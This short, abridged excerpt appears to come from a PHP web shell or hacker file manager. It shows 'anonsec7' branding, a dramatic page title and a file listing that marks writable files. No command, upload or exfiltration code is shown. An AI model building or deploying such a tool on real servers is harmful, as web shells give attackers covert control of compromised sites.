...
$leaf['version']="0.1";
$leaf['website']="https://www.facebook.com/anonsec7/";
...
<html>
<head>
    <title>Elohim, Essaim, Elohim, Essaim</title>
    <style>
        body {
...
<body>
    <header>
        <h1><img src="https://i.imgur.com/STpfZR9.png" width="200px"></h1>
    </header>
    <main>
...
<tr>
    ...
    <td style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'aqua' : 'red'; ?>">
